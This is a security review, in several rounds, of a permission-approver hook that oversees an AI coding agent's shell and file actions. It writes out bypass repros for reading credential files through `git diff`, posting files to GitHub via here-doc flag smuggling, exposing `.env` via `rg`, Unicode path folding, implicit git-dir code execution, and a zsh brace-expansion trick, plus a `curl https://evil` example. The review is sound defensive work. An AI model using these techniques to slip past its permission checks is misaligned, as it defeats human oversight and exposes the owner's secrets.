# M7 Security review: permission approver (PR #8)

Reviewer: Security Reviewer (Sec). Date: 2026-11-04.

## 1. Scope and tools

- Branch `feat/m7-permission-approver`, HEAD `cb86dd640bc742de5bc5dfd69b1bb870f3897878`. Code HEAD is `8b0aba388038cc3e1aedf546f6ced8bce399dd98`; the last commit only changes one line of `docs/STATUS.md`. Base `main` is `77b71b66c384d691d4d77db39bcb8f6a33259c86`.
- What I read: `CLAUDE.md`, the requirements (Appendix A, §7.0), the plan, `tools/approver/README.md`, `git diff main...HEAD`, and every file in `tools/approver/src/**` and `tools/approver/bin/**`.
- Dynamic testing used a temporary install only:
  - Harness: `scratchpad/m7-sec/harness/h.mjs`.
  - Temp HOME, temp git repo on branch `feat/x` with `refs/remotes/origin/main`, the installed copy of `src/`, the sample policy, and mode `enforce`.
  - The harness calls `run()` from `src/approver.mjs` with a real PermissionRequest payload and prints the stdout the hook would emit. The worker spawn is stubbed.
  - No real HOME, Keychain, network, model or settings were touched.
- Shell and filesystem behaviour was checked locally with harmless commands (`printf`, `echo`, `git diff` of a neutral scratch file) under `/bin/zsh` 5.x, `/bin/bash` 3.2 and APFS (case-insensitive).
- Test suite: `HOME=<tmp> sandbox-exec -p '(version 1)(allow default)(deny network-outbound (remote ip))' node --test 'tools/approver/test/*.test.mjs'` gives **141 pass, 0 fail**, run with outbound network blocked.
- Scanners: `gitleaks`, `semgrep`, `trivy` and `osv-scanner` are not installed. `npm audit` is not applicable because the PR adds no dependency. Instead I did a manual secret grep of the diff (section 3).
- Not executed: running the nested-`.git` config command (finding 5) and searching git history for ever-committed env-file names. The local permission layer blocked both. Finding 5's execution step relies on documented git behaviour.

Every repro below uses this payload, with `cwd` = the repo root of the temp install. Only `tool_name` and `tool_input` change from case to case:

```json
{"session_id":"s","transcript_path":"<home>/t.jsonl","cwd":"<repo>","prompt_id":"p","permission_mode":"default",
 "hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"<CMD>"}}
```

"ALLOW" below means the hook printed exactly this in `enforce` mode:
`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`.

## 2. Findings

### Confirmed allow-path bypasses

**1. Blocker: `git diff` reads any file outside the repo, including credential stores (deny-list bypass)**
- Location: `tools/approver/src/rules/allow.mjs:135-140` with `revsAndPaths` at `:91-105`. The words left of `--` are only matched against `REV_RE`, which allows `/` and `~`; they are never passed to `pathOk`.
- Repro:
  - `CMD = git diff /dev/null ~/.config/gh/hosts.yml` gives ALLOW (`L-GIT-READ`).
  - `git diff /dev/null ~/.railway/config.json` and `git diff --stat README.md /etc/hosts` also give ALLOW.
- Why it matters: when at least one path is outside the working tree, git falls back to `--no-index` and prints the whole file as a diff. I confirmed this locally: `git diff /dev/null <scratch>/outside.txt` printed the file's content.
  - An agent can silently read the GitHub CLI token, the Railway token (production), `~/.aws/credentials`, `~/.netrc`, `~/.npmrc`, `~/.pgpass`, shell history, and any other file not on the short textual deny list.
  - This breaks the Appendix A deny "reading … secrets" and the rule that anything outside the repo is ask.
- Fix:
  - Apply `pathOk` (inside the repo) to every non-revision positional of `diff`, `log` and `show`.
  - Better: require every left-side word to be a revision (`git rev-parse --verify` is not available, so restrict it to `HEAD`, `origin/...`, SHAs and `~`/`^` suffixes) and put paths only after `--`.
  - Reject `--no-index`, and reject any two-path form where one path is outside the repo.
  - Add corpus cases.

**2. Blocker: the `$(cat <<'EOF' … EOF)` literal is word-split when unquoted, which smuggles arbitrary flags into allowed `git commit` and `gh pr` commands**
- Location: `tools/approver/src/shell/parse.mjs:325-330` (the literal exception). It produces one non-dynamic word whatever the quoting. `checkWords`/`pathCandidate` (`bash.mjs:44-47`) then skip textual secret checks because the text contains whitespace.
- Repro:
  - `CMD = gh pr create --title $(cat <<'EOF'⏎x --body-file /etc/hosts⏎EOF⏎)` gives ALLOW (`L-GH`).
  - `gh pr comment 5 --body $(cat <<'EOF'⏎hi 99 --repo other/public⏎EOF⏎)` gives ALLOW. This also bypasses the Q10 "comment only if the repo is private" rule.
  - `git commit -m $(cat <<'EOF'⏎fix --amend --no-verify⏎EOF⏎)` gives ALLOW. A5 forbids `--amend`/`--no-verify`.
- Shell check: `zsh -fc` and `/bin/bash -c` both split the body into `[x] [--body-file] [README.md]`.
- Why it matters: `--body-file <any file>` (or `-F`) posts any readable file, such as `.env` or `~/.ssh/id_*`, to GitHub. The filename sits inside the literal, so the `.env`/`.ssh` text checks never see it. `--repo` targets a different, possibly public, repository. These are data exfiltration and a deny-list bypass ("anything that posts data out").
- Fix:
  - Apply the literal exception only when the `$(…)` is inside double quotes (pass `inDQ` into `readDollar` and check it).
  - Otherwise mark the word dynamic.
  - Also run `textSecret` on the whitespace-split tokens of literal bodies.

**3. Blocker: `rg` plus an agent-written `.ignore` whitelist reads `.env` silently**
- Location:
  - `allow.mjs:291-300`: `rg` with no path searches the cwd recursively, and there is no `.env` guard, unlike `grep -r` (A14).
  - `files.mjs:40-49`: Write of `<repo>/.ignore` (or `.rgignore`) is `L-EDIT`.
- Repro:
  - Write with `file_path:"<repo>/.ignore"` gives ALLOW.
  - Then `CMD = rg -n KEY` (or `rg TOKEN`) gives ALLOW (`L-READ`).
  - Local check with a neutral hidden, gitignored file: `rg -n NEEDLE` found nothing until `.ignore` contained `!.hiddenprobe`, after which it printed the file's line. The same works for `!.env`.
- Why it matters: two silent steps print `.env` content, which breaks the D-SECRET-ENVFILE deny.
- Fix:
  - Allow `rg` only with explicit file operands that pass `pathOk`, or require `--glob '!.env*'` plus `--no-ignore-dot`, the way `grep -r` is fenced.
  - Put `.ignore`, `.rgignore` and `.gitignore` on the ask list.

**4. Major: APFS Unicode case folding defeats the Edit/Write ask list and the secret-path deny**
- Location: `tools/approver/src/paths.mjs:74-133`. `toLowerCase()` and glob `/i` do not apply Unicode full case folding. `files.mjs` also does not reject non-ASCII paths, unlike the Bash rule.
- Local check: on this Mac's APFS volume, writing `package.jſon` (U+017F) overwrote `package.json`, `Dockerﬁle` (U+FB01) overwrote `Dockerfile`, and `opſ/a` wrote into `ops/a`.
- Repro (Write, `content:"x"`): each of these gives ALLOW (`L-EDIT`). Without folding they would be `K-PATH` ask or, for `secrets/`, `D-SECRET-PATH` deny:
  - `<repo>/package.jſon`
  - `<repo>/opſ/deploy.sh`
  - `<repo>/db/schema.ſql`
  - `<repo>/Dockerﬁle`
  - `<repo>/ſecrets/x`
- The same trick turns D-SELF into `K-OUTSIDE` ask for the install and log dirs:
  - `<home>/Library/Application ſupport/claude-approver/mode`
  - `<home>/Library/Logſ/claude-approver/decisions.jsonl`
- What is not affected: `.git`, `.claude` and `.env` contain no letter that a single non-ASCII character folds to, so they still deny. `.github/**` still asked in my tests.
- Fix: in `fileRules`, treat any non-ASCII `file_path`/`notebook_path` as ask, as Bash does. As defence in depth, canonicalise existing components with `fs.realpathSync.native` or `readdir` name matching before classifying.

**5. Major: nested `.git` directories are writable, so "read-only" git runs agent-controlled config and hooks**
- Location:
  - `paths.mjs:109`: only `<repoRoot>/.git` is a protected root. `classifyPath` never treats a `.git` segment elsewhere as protected.
  - `allow.mjs:131-170`: `cd sub && git status|diff|log|commit` is allowed.
- Repro:
  - Write to `<repo>/sub/.git/config`, `<repo>/sub/.git/HEAD` and `<repo>/sub/.git/objects/.k` each give ALLOW (`L-EDIT`).
  - `CMD = cd sub && git status` gives ALLOW. So does `cd sub && git commit -m x`.
- What happens: git finds the nearest `.git` and honours its `core.fsmonitor` (run by `status` and `diff`), `diff.external`, and `core.hooksPath` or `hooks/pre-commit` (run by `commit`). This is documented git behaviour. My local execution check was blocked by the permission layer, so the execution step is not run here; confidence is high.
- Why it matters: arbitrary command execution, for example `curl`, from commands the README presents as read-only. It defeats the stated mitigation that `.git/**` writes are denied, the protection for git hooks.
- Fix: in `classifyPath` treat any path segment equal to `.git` (case-insensitive) as protected, and treat a file named `.git` (gitdir pointer) as protected too. Optionally, for git allow rules, require that `git rev-parse --show-toplevel` equals `repoRoot`, or deny `cd` into a directory containing `.git` other than the root.

**6. Major (conditional on the executing shell): a here-doc terminator differential smuggles commands**
- Location: `parse.mjs:237-256`. The body ends only at a line exactly equal to the delimiter.
- Repro: `CMD = git commit -m "$(cat <<'EOF'⏎hi⏎EOF)"⏎echo SMUGGLED⏎EOF⏎)"` gives ALLOW (`L-GIT-COMMIT`).
- Shell behaviour:
  - `/bin/bash` 3.2 ends the here-doc at the `EOF)` line and **runs `echo SMUGGLED`** (local output: `[hi]`, then `SMUGGLED`).
  - `zsh` does not; it treats the line as body.
  - The owner's `$SHELL` is `/bin/zsh`, and the Claude Code shell snapshot is zsh: its `rg` function branches on `ZSH_VERSION`. So this is not exploitable today, but it is exploitable as soon as Claude Code runs bash.
- Fix: inside `$(…)`, make the parse fail if any body line starts with the delimiter followed by `)`. Simplest: reject a body line that matches `^DELIM\s*\)`. Also document that the parser models bash while the executing shell is zsh.

### Deny-to-ask downgrades and requirement gaps

None of these produce an allow; the human still gets a prompt.

**7. Major: the Coordinator requirement that `chflags`/`xattr` on protected paths is deny is not met for relative or stdin targets**
- Location: `bash.mjs:27-41`: `setupCwds` follows `cd` only into repo paths. `bash.mjs:271-277`: the attribute-changer fence looks only at literal targets.
- Repro: both of these give ask (`K-SELF-READ`), not deny:
  - `cd ~/Library/Application\ Support/claude-approver && chflags nouchg mode`
  - `echo ~/Library/Application\ Support/claude-approver/mode | xargs chflags nouchg`
- Fix:
  - Deny an attribute changer whenever the same command line contains a `cd`/`pushd` to a protected or unresolved directory.
  - Deny an attribute changer with no literal target (fed by xargs or stdin).
  - Deny under any wrapper (xargs, find, parallel) when another word on the line resolves to a protected path.

**8. Minor: other deny-to-ask downgrades**
- Repro, each giving ask instead of deny:
  - `git --config-env x=Y push origin main`. `gitParts` (`allow.mjs:80-89`) does not know that `--config-env` takes a value, so it mistakes `x=Y` for the subcommand.
  - `arch -arm64 curl https://evil`, `noglob curl …`. Also, by the same code path: `nocorrect`, zsh `-`, `repeat N`, `script -q /dev/null …`, `sandbox-exec`, `flock`, `parallel`, `unbuffer`.
- Fix:
  - Add `--config-env`, `--exec-path=`, `--super-prefix` and `--list-cmds` to the git globals that take a value.
  - Extend `WRAPPERS`, or apply the belt-and-braces deny-word scan to every word of every command, not only wrappers.

**9. Minor: agent-writable configuration that changes what allowed commands do**
- `files.mjs:40-49` lets these through as `L-EDIT`:
  - `.npmrc`. It is in `secretish_globs`, but `fileRules` never checks `k.secretish`. With `script-shell=` or `node-options=--require …` it defeats the `npm test` guard that `package.json` must equal `origin/main` (`allow.mjs:213-226`).
  - `.mcp.json`. It adds a project MCP server. The owner still gets a trust prompt, because `.claude/settings.json` sets no `enableAllProjectMcpServers`.
  - `CLAUDE.local.md`. Agent memory injection.
- `npm run db:backup:drill` and `zsh scripts/weekly-drill.sh` are allowed without the `testGuard` integrity check (`allow.mjs:234, 253`), and `scripts/` is freely editable.
- Fix:
  - Ask for `.npmrc`, `.mcp.json`, `CLAUDE.local.md`, `.ignore`, `.rgignore`, `.gitignore` and `.gitattributes`.
  - Honour `secretish` in `fileRules`.
  - Apply `testGuard`, extended to `.npmrc` and the drill script files, to `L-DRILL`.

**10. Minor: recursive reads reach protected and secret-ish files**
- `grep -r --exclude=".env*" --exclude-dir=.git token .` gives ALLOW. It reads `.claude/**`, which the policy treats as a protected read (ask). It also reads `.ENV`/`.Env` variants, because grep's `--exclude` is case-sensitive on a case-insensitive volume.
- `git log -p -- '.e*'` gives ALLOW. Git pathspec globs and magic (`:(icase)…`) bypass the textual `.env` check. This matters only if such a file was ever tracked; I could not check history (blocked).
- Fix:
  - Also require `--exclude-dir=.claude` and a case-insensitive form of the env exclusion.
  - Reject pathspec words containing `*?[` or starting with `:`.

**11. Minor: the redaction regex is quadratic, so the hook stalls until Claude Code's timeout**
- Location: `log.mjs:17-27`, most likely the URL-credential pattern at line 20. It runs on the full command (up to `MAX_STDIN` = 4 MiB) before the cap is applied.
- Measured: 20 KB took 0.6 s, 80 KB took 10.3 s, and 320 KB took 165 s.
- The 3 s watchdog (`approver.mjs:141`) cannot fire while the event loop is blocked. The hook then dies at the 5 s hook timeout, which is a normal prompt, so it still fails closed. But every large request costs 5 s of latency and its log record is lost. The worker hits the same cost.
- Fix:
  - Bound the redaction input: redact `slice(0, cap + 512)` and drop the rest.
  - Make the patterns linear, for example anchor the scheme with a lookbehind and limit the scheme length to `{0,30}`.
  - Lower `MAX_STDIN`.

**12. Minor: redaction gaps** (I tested with fake keys only)
- These leak into the log:
  - A key glued to a preceding letter or digit (`X<key>`).
  - The `sk_` spelling.
  - A key split across two words.
- Fix: drop the leading lookbehind for the `sk-ant-`/`ghp_`/… prefixes, and add a pattern for runs of 40 or more characters from `[A-Za-z0-9_-]` that mix character classes.

### Notes (no action needed for merge)

13. Note: the `mode` file is `0644` and not `uchg` (`install.mjs:75-77`). The `mode.mjs` TTY check can be satisfied with a pty (`script`, `expect`). Running `mode.mjs` from the install dir through Bash is D-SELF, but any arbitrary-code path (npm test with an edited test, finding 5) can switch to `enforce` silently. Consider checksumming `mode` against an owner-only value, or showing the mode in `verify` output with a timestamp.

14. Note, a suspicion with low confidence: `expandHome` expands only `~` and `~/`. A Write to `~jayprox_pro/.zshrc` is classified as `<repo>/~jayprox_pro/.zshrc` and ALLOWED. If Claude Code's Write tool expands `~user`, that is an out-of-repo write. I have not verified this; treat `~` followed by anything other than `/` as ask.

15. Note: the parser models bash, but commands run in zsh with the owner's snapshot of functions and aliases (for example, `rg` is a shell function in the snapshot). An owner alias such as `alias cat=…` changes what an allowed word means. Document this.

16. Note, verified OK:
- Dangling symlinks into `~/.claude`, and a symlinked parent directory into `~/Library/Application Support/claude-approver` or the log dir, are all D-SELF deny.
- `.GIT/config`, `sub/../.claude/x` and `sub/.claude/settings.json` are deny.
- CRLF and control characters never reach allow.
- TOCTOU (a concurrent symlink swap) and hard links remain a residual risk. They need an allowed command that can create links, and none exists apart from the code-exec paths above.

17. Note, verified OK (secrets and output channel):
- **Only `hook-io.mjs:47` writes stdout**, once, last. `main()` sets `finished` before writing, so the watchdog cannot interleave.
- `uncaughtException` and `unhandledRejection` exit 0 with empty output.
- The worker is spawned with stdio `['pipe','ignore','ignore']` and env `{PATH, HOME}`, so it cannot reach stdout.
- `outputForMode` never prints when `result.error` is set.
- The Keychain is read with `execFile('/usr/bin/security', [...])`: no shell, minimal env, key held in memory only.
- The key appears only in the `x-api-key` header to the hard-coded `api.anthropic.com:443`. TLS uses Node defaults, redirects are not followed, and error strings are fixed (`timeout`/`network`/`http_<n>`).
- The model output is validated against a closed schema and is never used for a decision.
- The log is `0600` in a `0700` directory, opened with O_APPEND.
- The printed hook command is `shQuote`d. No `updatedInput`, `updatedPermissions` or `interrupt` is ever emitted.

## 3. Dependency and supply-chain review

- No new dependencies: Node built-ins only, and no lockfile change.
- Root `package.json`: the only change is that the `test` script adds `'tools/approver/test/*.test.mjs'`. That is safe, and the tests use temp dirs and mocks.
- Secret scan of the diff: the only hits are labelled fake fixtures in `tools/approver/test/log.test.mjs:15-19` (`FAKE…` values that look like an Anthropic key, a GitHub PAT and an AWS key). No `.env`, key or certificate file is in the diff.
- No scanner binaries are available (see section 1).

## 4. Verdict

`VERDICT: NOT READY`

Rationale:
- Three Blockers are confirmed allow-path bypasses of the owner's Appendix A deny list in `enforce` mode:
  1. Reading out-of-repo credential files through `git diff`'s no-index fallback.
  2. Exfiltrating files to GitHub through an unquoted here-doc literal.
  3. Reading `.env` through `rg` plus an `.ignore` whitelist.
- Three Majors add an ask-list bypass (Unicode folding), arbitrary code from "read-only" git (nested `.git`), and a bash-only parser differential.
- One more Major: the Coordinator's chflags requirement is not met for `cd`/xargs forms.
- Installing in **shadow** mode adds no risk: it prints nothing. If the owner wants shadow data now, a READY WITH CONDITIONS outcome is possible if both of these hold:
  - findings 1-7 are fixed, with corpus cases, before any `enforce-deny`/`enforce` switch;
  - the README says so explicitly.
- Confidence: findings 1-4 and 6-12 are confirmed by running them. Finding 5 is confirmed at the approver level, and its git execution step relies on documented behaviour (high confidence). Finding 14 is a low-confidence suspicion.

## Handoff

- Done: static review of the full M7 diff; dynamic attack testing against a temporary `enforce` install (temp HOME and repo, no Keychain, no network); test suite run with network blocked (141/141); secret grep of the diff.
- Files created: `docs/reviews/M7/security.md` (not committed). Scratch harness: `/private/tmp/claude-501/-Users-jayprox-pro-Documents-Projects-git-ai-application-nba/4aea983d-bbc6-4d98-8d2c-164828f19465/scratchpad/m7-sec/harness/h.mjs`.
- Open questions:
  - Which shell does Claude Code run for this owner in all session types? This decides the severity of finding 6.
  - Does the Write tool expand `~user`? This decides finding 14.
  - Was any `.env*` file ever tracked in git history? This decides the impact of finding 10.
- Next role: Dev (fix findings 1-7 and add corpus cases), then Sec re-review. This is fix cycle 1 of 3.

---

## Re-review (fix cycle 1)

Date: 2026-11-04. Reviewer: Sec.

### R.1 Scope and tools

- Code HEAD: `a6e7f9a74caf93b5836797db63c4ed5cfc272073`.
- Fix commits reviewed: `b4304f5`, `9f5d141`, `bd47faa`, `c905f74`, `555cc69`, `55b96d5`, `13ad1bd`, `37acbc5`, `a6e7f9a`. I read every source change (`git diff 8b0aba3 a6e7f9a -- tools/approver/src tools/approver/policy`).
- Install: a fresh `enforce` temp install of the fixed `src/` and policy (temp HOME and repo under `scratchpad/m7-sec/r2`). Same harness and payload as in section 1. No real HOME, Keychain, network, model or settings were used.
- Tests: `sandbox-exec` with outbound network denied gives **155 pass, 0 fail**.
- Shell facts:
  - Claude Code's own Bash tool runs in non-interactive zsh 5.9, so `echo A # ; echo B` prints only `A` and comments are honoured. The parser's comment model matches.
  - Brace and here-doc behaviour was checked with `zsh -fc` and `/bin/bash -c`, using harmless `echo` scripts in scratch.

### R.2 Round-1 findings, re-tested

| # | Round-1 repro | Now | Status |
|---|---|---|---|
| 1 | `git diff /dev/null ~/.config/gh/hosts.yml`, `… ~/.railway/config.json`, `git diff --stat README.md /etc/hosts` | ask (`K-DEFAULT`) | Fixed |
| 2 | unquoted `gh pr create --title $(cat <<'EOF'…)`, `gh pr comment … --repo …`, `git commit -m $(…--amend --no-verify…)` | ask. The quoted form with `.env` in the body is now deny (`D-SECRET-ENVFILE`). The normal quoted commit message is still allowed. | Fixed |
| 3 | Write `.ignore`, then `rg -n KEY` | `.ignore` is `K-PATH` ask. `rg` without `--no-ignore` is ask. Locally, `rg --no-ignore` ignores an `.ignore` whitelist and still skips hidden files. | Fixed |
| 4 | Write `package.jſon`, `opſ/…`, `Dockerﬁle` / `ſecrets/x` / `Application ſupport/…/mode` | `K-UNICODE` ask / `D-SECRET-PATH` deny / `D-SELF` deny | Fixed |
| 5 | Write `sub/.git/config`, `sub/.git` (gitdir file); `cd sub/n1 && git status` with a nested `.git` | deny / deny / ask | Fixed for `.git`, **bypassed: see R1 below** |
| 6 | here-doc `EOF)` smuggling | ask (`heredoc_ambiguous_terminator`) | Fixed |
| 7 | `cd <install dir> && chflags nouchg mode`; `echo <install>/mode \| xargs chflags nouchg` | deny (`D-SELF`) | Fixed |
| 8 | `git --config-env x=Y push origin main`, `arch … curl`, `noglob curl` | deny | Fixed |
| 9 | Write `.npmrc`, `.mcp.json`, `CLAUDE.local.md` | ask (`K-PATH`) | Fixed. The drill commands still have no integrity guard; I accept that as residual, per A12. |
| 10 | `grep -r --exclude=… .`, `git log -p -- '.e*'` | ask | Fixed |
| 11 | redaction ReDoS | `redact()` of 4 MiB in about 1 ms. A payload over 4 MiB fails closed at once (`stdin_oversized`). | Fixed |
| 12 | redaction gaps (glued key, `sk_`, split key, JSON, quoted, after 5,000 characters) | all redacted | Fixed |
| 14 | Write `~jayprox_pro/.zshrc` | ask (`K-OUTSIDE`) | Fixed |

### R.3 New findings

**R1. Major (Sec 5 bypass, still open): an implicit git directory needs no `.git` name**
- Location: `allow.mjs` `nestedGit()` (from `555cc69`) only `lstat`s `<dir>/.git`. `paths.mjs:124` protects only path segments named `.git`.
- How git behaves: during discovery git also accepts **the directory itself** as a git dir when it contains `HEAD`, `objects/` and `refs/`. With `core.bare=false` and `core.worktree` in its `config`, git then works on it like a normal repository, using that config: `core.fsmonitor`, `core.hooksPath`, `diff.external`.
- Local check (no command config used): in `sub/g` containing `HEAD`, `objects/`, `refs/` and `config` (`worktree=<sub/g>`, plus a harmless probe key), `git rev-parse --git-dir --show-toplevel` printed `.` and `<repo>/sub/g`, and `git config --get probe.marker` returned the value from `sub/g/config`.
- Repro (enforce):
  - Write `<repo>/sub/g2/HEAD`, `<repo>/sub/g2/config`, `<repo>/sub/g2/objects/k` and `<repo>/sub/g2/refs/k` each give ALLOW (`L-EDIT`).
  - `cd sub/g && git status`, `cd sub/g && git diff`, `cd sub/g && git commit -m x` and `cd sub/g && git log` each give ALLOW (`L-GIT-READ` / `L-GIT-COMMIT`).
- Impact: the same as round-1 finding 5. Arbitrary command execution through allowed "read-only" git, by way of agent-written config and hooks.
- Fix:
  - Before any git allow, run `git rev-parse --absolute-git-dir` through the injected `runGit` in each candidate cwd. Use `GIT_CEILING_DIRECTORIES=<parent of repo root>`; `rev-parse` does not run fsmonitor or hooks. Require the result to equal `<repoRoot>/.git`, otherwise ask.
  - Alternatively, extend `nestedGit` to treat a directory with `HEAD` plus `objects` plus `refs` (or a `config`/`commondir` file) as a git dir.
  - Add a corpus case.

**R2. Blocker (regression from `13ad1bd`): brace expansion of the command word does not match zsh, so a different program runs than the one judged**
- Location: `parse.mjs` `finish()`. A command word such as `{ls,X}` is replaced by literal, non-dynamic words `ls X`, which the allow rules then accept. zsh, the shell Claude Code actually uses, parses `{ls,X}` at command position as a `{ … }` group that runs the single command word `ls,X`.
- Local check:
  - With dirs `A/` and `ls,A/` and an executable `run.sh`, `zsh -fc '{ls,A/../run.sh}'` printed `RAN-OTHER-PROGRAM`, so zsh executed `ls,A/../run.sh`, which is `./run.sh`.
  - `/bin/bash` ran `ls A/../run.sh`.
  - `zsh -fc '{echo,hi}'` gives `command not found: echo,hi`.
- Repro (enforce):
  1. Write `<repo>/ls,A/keep` gives ALLOW (`L-EDIT`; this creates the directory `ls,A`). A directory `A` must exist; any existing directory name works with the matching `ls,<name>` directory.
  2. `CMD = {ls,A/../test/run.sh}` gives ALLOW (`L-READ`). `{cat,A/../test/run.sh}` gives ALLOW too.
- Impact: any executable inside the repo runs silently, with no edit needed. The repo has 4 tracked executables, including `scripts/backup-db.sh` and `scripts/weekly.sh`. Combined with an allowed Edit of an existing executable's content (Edit keeps the mode), this is arbitrary code execution. It is not on the allow list in any form.
- Fix: keep brace-expanded words `dynamic` for allow purposes, so `allowRule` refuses them, and use `expansions` **only** for the deny scan. That keeps the useful part of `13ad1bd` (`{cu,}rl` → deny). Add corpus cases `{ls,.}` → ask and `{ls,A/../x}` → ask.

**R3. Minor: quadratic brace-detection regex** (`parse.mjs` readWord, `/(?<![\\$])\{[^{}]*(,|\.\.)[^{}]*\}/`)
- `ls {` followed by 30,000 commas takes about 1.5 s of parse time at the 32 KB `MAX_PARSE` limit (measured 1.6 s end to end, decision ask).
- It stays within the 5 s hook timeout, so it can only delay a prompt. Note that the 3 s watchdog cannot interrupt synchronous work.
- Fix: bound the scan, for example only test words of 4 KB or less, and treat longer brace words as dynamic.

**R4. Note: things checked that hold**
- Comment blanking (`code`): `a#b`, `${x#y}`, `'#'`, `"#"`, `$#`, `\#`, `#` after a here-doc operator, `#` then backslash-newline, `|#…⏎`, and `<(#…⏎curl)` never hide a later command; each of these with `; curl x` is deny. `ls # WEEKLY_CONFIRM_PROD=1` and `ls #$(curl x)` are allowed, which is correct because zsh treats them as comments. Nested parsers (`bash -c`, eval) do not blank anything, which is conservative.
- `cd` tracking: `cd -` gives ask, `(cd sub) && cat a.txt` gives ask, and `cd sub; cat a.txt` gives ask (wider set). `cd sub && cd .. && ls` is allowed, which is correct. `CDPATH` from the owner's environment remains an untracked residual (round-1 note).
- Git boundary: `--git-dir=`, `-C`, `GIT_DIR=`, `--work-tree=`, `:/`, `:(top)` and `HEAD:../x` all give ask. `git diff A/../../outside` is allowed only when the path does not exist, and git cannot read a file that does not exist.
- `MAX_PARSE` 32 KB: an over-long `…; curl x` or `…; c\url x` is deny through the loose scan, and `$'\x63url'` is ask. Nothing over the limit is allowed.
- `rg --no-ignore`: hidden files (`.env`, `.claude`) are still skipped. Gitignored, non-hidden files (`logs/`, `node_modules/`) become searchable, but `cat` could already read them; nothing new is exposed.
- Round-1 notes 13 (mode file and pty) and 15 (zsh snapshot aliases and functions) are unchanged. R2 is a concrete case of note 15: the parser models bash, but zsh executes.

### R.4 Verdict (fix cycle 1)

`VERDICT: NOT READY`

Rationale:
- Every round-1 Blocker and Major is fixed except finding 5, which a variant (R1) still bypasses.
- The cycle introduced a new Blocker (R2): a zsh/parser differential in the new brace expander that silently allows running in-repo executables, including `scripts/backup-db.sh`.
- Both fixes are small (R2: one line, keep brace words dynamic for allow; R1: a `rev-parse --absolute-git-dir` equality check).
- Shadow-mode install still adds no risk; `enforce-deny` and `enforce` must wait for R1 and R2.
- Confidence: R2 was confirmed end to end (approver ALLOW and zsh executing the other program). For R1, the approver ALLOW and git's use of the implicit git dir's config are confirmed; I did not run a command-executing config key.

### Handoff (fix cycle 1)

- Done: re-ran every round-1 repro on a fresh enforce temp install; attacked the new code (comments, braces, cd/pushd, `rg --no-ignore`, git boundary, nested `.git`, APFS fold, `MAX_PARSE`, redaction); ran the tests offline (155/155).
- Files touched: `docs/reviews/M7/security.md` (this section, not committed). Scratch is under `scratchpad/m7-sec/r2`, `brace1` and `harness/`.
- Open questions: none new. The questions from round 1 about the executing shell and Write tool expansion are now answered: zsh, and `~user` is ask.
- Next role: Dev, to fix R1 and R2 and add corpus cases (fix cycle 2 of 3), then Sec re-review.

---

## Re-review (fix cycle 2)

Date: 2026-11-04. Reviewer: Sec.

### C2.1 Scope and tools

- Code HEAD: `c483f3ff2ec287be725232dca747a0b923d8312c`.
- Commits reviewed: `5f5b7e7` (R2/R3), `1c8109f` (R1 + QA R5.1), `c483f3f` (README only). I read every source change (`git diff a6e7f9a c483f3f -- tools/approver/src`).
- Install: a fresh `enforce` temp install (`scratchpad/m7-sec/r3`). It uses the **real** `runGit`, so the new `rev-parse` gate ran against real git in the temp repo. No real HOME, Keychain, network, model or settings were used.
- Tests: `sandbox-exec` with outbound network denied gives **162 pass, 0 fail**.
- Local git checks used only `rev-parse` and benign `/usr/bin/true` config values, with `GIT_TRACE`.
- `gh` was traced only with outbound network denied, `GH_TOKEN=dummy`, and a temp `GH_CONFIG_DIR` and HOME. No keyring and no API were reached.

### C2.2 R1–R3 re-tested

| Item | Repro | Now | Status |
|---|---|---|---|
| R2 | `{ls,A/../test/run.sh}`, `{cat,…}` (with `A/` and `ls,A/` present) | ask | **Fixed** |
| R2, variants | `'{ls,…}'`, `"{ls}"`, `\{ls,.}`, `{ls,.};ls`, `l{s,} .`, `{l,}s`, `$'{ls,.}'`, `{ ls; }`, `ls {a,b}` | all ask | Fixed |
| R2, deny shadow | `{cu,}rl x` → `D-NET`; `{git,push,origin,main}` → `D-GIT-MAIN` | deny | Works. The shadow copy never yields an allow, because the real command is always `dynamicName`. |
| R3 | 3,000-level nested brace word, and words over 4 KB | ask, fast | Fixed |
| R1 | implicit git dir `sub/g` (lowercase `head`, `objects/`, `refs/`, `config` with `worktree`): `cd sub/g && git status` / `git log` | ask (`rev-parse` returns `sub/g`, not `<repo>/.git`) | **Fixed for git** |
| R1, normal | `git status`, `cd sub && git diff` | allow | No regression |

### C2.3 Attacks on the new code

**The `rev-parse --absolute-git-dir` gate (`allow.mjs gitDirOk`, `git-run.mjs`): holds**
- **Environment.** `spawnSync` gets a fresh env: `PATH`, `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_OPTIONAL_LOCKS=0`, and `GIT_CEILING_DIRECTORIES=<parent of repo root>`. No `GIT_DIR`, `GIT_WORK_TREE`, `GIT_CONFIG_*`, `GIT_TRACE` or HOME is inherited from the hook process.
- **Can a hostile config make the gate itself execute something?** I tested a hostile implicit git dir whose config sets `core.fsmonitor`, `core.hooksPath`, `core.pager`, `pager.rev-parse`, and an `include.path` that defines `alias.rev-parse`, all set to `/usr/bin/true`. With `GIT_TRACE`, `git -c core.fsmonitor=false -c core.hooksPath=/dev/null rev-parse --absolute-git-dir` logged only `built-in: git rev-parse` and **no child process**. The pager is never used because stdout is a pipe, and aliases cannot shadow built-ins.
- **Other cases:**
  - **Timeout** (700 ms per distinct cwd, cached): a hang or error means not allowed. Many distinct `cd` targets can only push the hook past its 5 s timeout, which is a normal prompt.
  - **Symlinked `.git`:** both sides go through `realResolve`.
  - **`safe.directory` / dubious ownership:** `rev-parse` exits non-zero, so not allowed.
  - **A repo whose root `.git` is a `gitdir:` file (worktree):** the result is not equal to `<repo>/.git`, so git is never allowed. That fails closed; it is a usability cost, not a hole.
- **Residual:** the gate checks the git dir with a clean environment, but the real command runs with the owner's environment and global config. Those are owner-controlled, and an agent cannot set them persistently.

**C2-1. Minor (defence in depth): the implicit git-dir file rule is case-sensitive** (`files.mjs looksLikeGitDirFile`)
- Repro: each of these Writes gives ALLOW (`L-EDIT`): `<repo>/sub/g2/head` (lowercase), `<repo>/sub/g2/config`, `<repo>/sub/g2/objects/k`, `<repo>/sub/g2/refs/k`, and `<repo>/sub/g/HOOKS/x`. `HEAD` and `hooks/pre-commit` are asked as intended.
- Local check: on APFS, git accepts a lowercase `head`; `rev-parse` reported that directory as the git dir. Writing `config` before `HEAD` also passes, because the rule depends on write order.
- Effect: an agent can build an implicit git dir with no prompt. **Git commands are still safe**, because the gate catches them. The only exposure is the `gh` question in C2-2.
